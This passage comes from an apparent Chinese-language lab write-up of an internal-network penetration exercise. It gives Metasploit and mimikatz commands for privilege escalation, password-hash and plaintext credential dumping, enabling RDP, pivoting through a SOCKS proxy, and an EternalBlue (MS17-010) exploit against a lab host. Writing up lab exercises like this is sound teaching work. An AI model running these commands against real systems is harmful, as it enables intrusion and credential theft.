+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121300186.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121300186.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121300186.png 2x"
+            sizes="auto"
+            alt="image-20230516121300186">
+    </a></figure></p>
+<p>随后<code>sessions -i 1</code>进入这个session</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516133857717.png" title="image-20230516133857717" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516133857717.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516133857717.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516133857717.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516133857717.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516133857717.png 2x"
+            sizes="auto"
+            alt="image-20230516133857717">
+    </a></figure></p>
+<h3 id="提权system" class="headerLink">
+    <a href="#%e6%8f%90%e6%9d%83system" class="header-mark"></a>1.1 提权system：</h3><p>这里已经是system权限了，如果是administrator的话，需要先提权<code>getsystem</code></p>
+<blockquote>
+<p>一般提权流程：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sysinfo
+</span></span><span class="line"><span class="cl">getuid  (发现是administor权限)
+</span></span><span class="line"><span class="cl">getsystem (获取system权限)
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<p>随后获取账号密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run hashdump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不知道为啥我除了一堆报错</p>
+<p>除了hashdump，msf提供了一个用来获取域内用户hash的脚本，执行以下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run post/windows/gather/smart_hashdump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516140936257.png" title="image-20230516140936257" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516140936257.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516140936257.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516140936257.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516140936257.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516140936257.png 2x"
+            sizes="auto"
+            alt="image-20230516140936257">
+    </a></figure></p>
+<p>然后把mimikatz上传到靶机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">upload</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:</span>\\
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">然后进入靶机的</span><span class="n">shell</span><span class="err">，运行</span><span class="n">mimikatz</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516141908799.png" title="image-20230516141908799" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516141908799.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516141908799.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516141908799.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516141908799.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516141908799.png 2x"
+            sizes="auto"
+            alt="image-20230516141908799">
+    </a></figure></p>
+<p>对mimikatz进行提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="抓取密码" class="headerLink">
+    <a href="#%e6%8a%93%e5%8f%96%e5%af%86%e7%a0%81" class="header-mark"></a>1.2 抓取密码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sekurlsa::logonPasswords
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516142417861.png" title="image-20230516142417861" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516142417861.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516142417861.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516142417861.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516142417861.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516142417861.png 2x"
+            sizes="auto"
+            alt="image-20230516142417861">
+    </a></figure></p>
+<p>看了其他大佬的博客，发现有更方便的方法：</p>
+<blockquote>
+<p>1.导入账号密码hash值：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run hashdump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.mimikatz</p>
+<p>加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程(需要system权限)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ps
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516201719751.png" title="image-20230516201719751" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516201719751.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516201719751.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516201719751.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516201719751.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516201719751.png 2x"
+            sizes="auto"
+            alt="image-20230516201719751">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">migrate</span> <span class="n">PID</span>
+</span></span><span class="line"><span class="cl"><span class="nb">load</span> <span class="n">mimikatz</span>
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz_command</span> <span class="o">-</span><span class="n">f</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">searchPasswords</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202510583.png" title="image-20230516202510583" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202510583.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202510583.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202510583.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202510583.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202510583.png 2x"
+            sizes="auto"
+            alt="image-20230516202510583">
+    </a></figure></p>
+<p>3.kiwi</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="nb">load</span> <span class="n">wiki</span>
+</span></span><span class="line"><span class="cl"><span class="n">creds_all</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202325608.png" title="image-20230516202325608" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202325608.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202325608.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202325608.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202325608.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202325608.png 2x"
+            sizes="auto"
+            alt="image-20230516202325608">
+    </a></figure></p>
+</blockquote>
+<h3 id="开启3389" class="headerLink">
+    <a href="#%e5%bc%80%e5%90%af3389" class="header-mark"></a>1.3 开启3389</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run post/windows/manage/enable_rdp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="内网搜集" class="headerLink">
+    <a href="#%e5%86%85%e7%bd%91%e6%90%9c%e9%9b%86" class="header-mark"></a>1.4 内网搜集</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ipconfig
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看到win7的另一个网卡的ip</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516203830987.png" title="image-20230516203830987" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516203830987.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516203830987.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516203830987.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516203830987.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516203830987.png 2x"
+            sizes="auto"
+            alt="image-20230516203830987">
+    </a></figure></p>
+<p>(中文字符编码问题出现的乱码，将就看吧)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//解决乱码问题
+</span></span><span class="line"><span class="cl">chcp 65001
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用<code>ipconfig /all</code>查看DNS服务器，推测DNS服务器名为god.org：</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204144471.png" title="image-20230516204144471" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204144471.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204144471.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204144471.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204144471.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204144471.png 2x"
+            sizes="auto"
+            alt="image-20230516204144471">
+    </a></figure></p>
+<p>查看域信息：<code>net view</code></p>
+<p>查看主域信息：<code>net view /domain</code></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204606672.png" title="image-20230516204606672" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204606672.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204606672.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204606672.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204606672.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204606672.png 2x"
+            sizes="auto"
+            alt="image-20230516204606672">
+    </a></figure></p>
+<h1 id="0x5横向渗透" class="headerLink">
+    <a href="#0x5%e6%a8%aa%e5%90%91%e6%b8%97%e9%80%8f" class="header-mark"></a>0x5横向渗透</h1><h2 id="添加路由" class="headerLink">
+    <a href="#%e6%b7%bb%e5%8a%a0%e8%b7%af%e7%94%b1" class="header-mark"></a>1 添加路由</h2><p>查看路由信息，添加路由到目标网络，以此使得MSF能够通过Win7路由转发访问,使得msf命令能够通过win7 访问到内网</p>
+<p>查看目标机器所在内网网端信息与公网网端信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run get_local_subnets
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205226856.png" title="image-20230516205226856" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205226856.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205226856.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205226856.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205226856.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205226856.png 2x"
+            sizes="auto"
+            alt="image-20230516205226856">
+    </a></figure></p>
+<p>添加内网路由 使得msf6能通过win7路由转发访问内网192.168.52.0/24网段：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run autoroute -s 192.168.52.0/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205335183.png" title="image-20230516205335183" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205335183.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205335183.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205335183.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205335183.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205335183.png 2x"
+            sizes="auto"
+            alt="image-20230516205335183">
+    </a></figure></p>
+<h2 id="扫描19216852024网段" class="headerLink">
+    <a href="#%e6%89%ab%e6%8f%8f19216852024%e7%bd%91%e6%ae%b5" class="header-mark"></a>2 扫描192.168.52.0/24网段：</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205733104.png" title="image-20230516205733104" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205733104.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205733104.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205733104.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205733104.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205733104.png 2x"
+            sizes="auto"
+            alt="image-20230516205733104">
+    </a></figure></p>
+<h2 id="扫描存活主机" class="headerLink">
+    <a href="#%e6%89%ab%e6%8f%8f%e5%ad%98%e6%b4%bb%e4%b8%bb%e6%9c%ba" class="header-mark"></a>3 扫描存活主机:</h2><p>先从win7的meterpreter session中退出来，执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/netbios/nbname
+</span></span><span class="line"><span class="cl">set rhosts 192.168.52.130
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516210721229.png" title="image-20230516210721229" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516210721229.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516210721229.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516210721229.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516210721229.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516210721229.png 2x"
+            sizes="auto"
+            alt="image-20230516210721229">
+    </a></figure></p>
+<h2 id="内网端口信息" class="headerLink">
+    <a href="#%e5%86%85%e7%bd%91%e7%ab%af%e5%8f%a3%e4%bf%a1%e6%81%af" class="header-mark"></a>4 内网端口信息：</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/portscan/tcp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211132837.png" title="image-20230516211132837" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211132837.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211132837.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211132837.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211132837.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211132837.png 2x"
+            sizes="auto"
+            alt="image-20230516211132837">
+    </a></figure></p>
+<h2 id="挂socks4a代理" class="headerLink">
+    <a href="#%e6%8c%82socks4a%e4%bb%a3%e7%90%86" class="header-mark"></a>5 挂socks4a代理</h2><p>挂代理是为了让其他工具能够通过win7 ，去访问192.168.52.0/24 网段</p>
+<p>配置msf代理：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/server/socks_proxy
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">show options
+</span></span><span class="line"><span class="cl">set version 4a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211420178.png" title="image-20230516211420178" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211420178.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211420178.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211420178.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211420178.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211420178.png 2x"
+            sizes="auto"
+            alt="image-20230516211420178">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">show options
+</span></span><span class="line"><span class="cl">set srvport 1080
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211601202.png" title="image-20230516211601202" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211601202.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211601202.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211601202.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211601202.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211601202.png 2x"
+            sizes="auto"
+            alt="image-20230516211601202">
+    </a></figure></p>
+<p>如果proxychains配置终端代理出现问题 修改一下文件<code>/etc/proxychains4.config</code></p>
+<p>再开一个终端nano编辑proxychains4.config，把端口改成1080，记得用root身份</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211944344.png" title="image-20230516211944344" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211944344.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211944344.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211944344.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211944344.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211944344.png 2x"
+            sizes="auto"
+            alt="image-20230516211944344">
+    </a></figure></p>
+<p>设置代理成功后 使用其他工具时需要添加<code>proxychains</code></p>
+<h2 id="渗透win2003远程登录" class="headerLink">
+    <a href="#%e6%b8%97%e9%80%8fwin2003%e8%bf%9c%e7%a8%8b%e7%99%bb%e5%bd%95" class="header-mark"></a>6 渗透win2003(远程登录)</h2><h3 id="信息收集" class="headerLink">
+    <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>6.1 信息收集</h3><p>扫描主机版本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/smb/smb_version
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set rhosts 192.168.52.141
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516213943669.png" title="image-20230516213943669" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516213943669.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516213943669.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516213943669.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516213943669.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516213943669.png 2x"
+            sizes="auto"
+            alt="image-20230516213943669">
+    </a></figure></p>
+<p>(emm，一开始没看到141就把前几个都扫了一遍。。。。)</p>
+<p>Nmap扫描 192.168.52.141</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains nmap -Pn -sT 192.168.52.141
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516212409997.png" title="image-20230516212409997" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516212409997.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516212409997.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516212409997.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516212409997.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516212409997.png 2x"
+            sizes="auto"
+            alt="image-20230516212409997">
+    </a></figure></p>
+<h3 id="尝试攻击" class="headerLink">
+    <a href="#%e5%b0%9d%e8%af%95%e6%94%bb%e5%87%bb" class="header-mark"></a>6.2 尝试攻击</h3><p>由nmap看到开放445端口
+尝试永恒之蓝攻击win2003</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_psexec
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">rhosts</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">52.141</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span></code></pre></td></tr></table>
+</div>
